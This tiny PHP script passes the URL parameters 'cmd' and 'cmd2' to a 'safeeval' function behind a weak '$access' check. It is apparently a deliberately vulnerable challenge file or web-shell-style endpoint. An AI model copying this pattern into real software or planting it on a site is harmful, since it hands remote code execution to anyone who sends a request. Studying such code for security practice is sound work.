<?php
    include ('safe.inc.php');
    if ($access=="allowed") {
        safeeval($_GET['cmd']);
	    if (!empty($_GET['cmd2'])) {
                safeeval($_GET['cmd2']);
	    }
        }
?>

